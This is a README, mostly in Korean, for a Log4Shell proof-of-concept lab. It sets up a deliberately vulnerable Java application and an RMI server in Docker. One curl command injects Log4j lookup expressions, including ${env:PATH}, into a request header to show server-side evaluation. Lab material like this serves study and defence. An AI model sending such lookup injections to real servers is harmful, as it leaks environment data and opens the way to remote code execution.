# Log4Shell-PoC
Log4Shell PoC with RMI, LDAP

## Vulnerable Application

### 빌드 및 실행

1. [DoTTak/Log4Shell-PoC](https://github.com/DoTTak/Log4Shell-PoC) 저장소로 부터 코드를 내려받은 뒤, 해당 프로젝트로 이동한다.
    
    ```bash
    git clone https://github.com/DoTTak/Log4Shell-PoC.git
    cd Log4Shell-PoC
    ```
    
2. 이후 `vulnerable-application` 폴더로 이동한 뒤, `Dockerfile` 을 빌드하여 도커 이미지를 생성한다.
    
    ```bash
    cd vulnerable-application
    docker build --platform linux/amd64 -t log4shell-poc-app .
    ```
    
3. 생성된 도커 이미지 `log4shell-poc-app:latest` 를 컨테이너로 실행하자.
    
    > 참고로, 웹 애플리케이션 서버 포트는 항상 `7777` 로 오픈 되어 있다. 변경은 `Application.java` 를 수정하면 된다.
    > 
    
    ```bash
    docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-poc-app -p 7777:7777 log4shell-poc-app
    ```

### 사용법

```bash
# 아래 명령어를 호스트 PC에서 실행할 경우 log4shell-poc-app 컨테이너 로그에 아래 메시지(헤더 'msg')가 출력된다.
curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${env:PATH}'
```

## RMI Server

### 빌드 및 실행
1.  `rmi-server` 폴더로 이동한 뒤, `Dockerfile` 을 빌드하여 도커 이미지를 생성한다.
    
    ```bash
    docker build --platform linux/amd64 -t log4shell-rmi-server .
    ```
    
2. 생성된 도커 이미지 `log4shell-rmi-server:latest` 를 컨테이너로 실행하자.
    
    ```bash
    docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-rmi-server -p 1099:1099 log4shell-rmi-server
    ```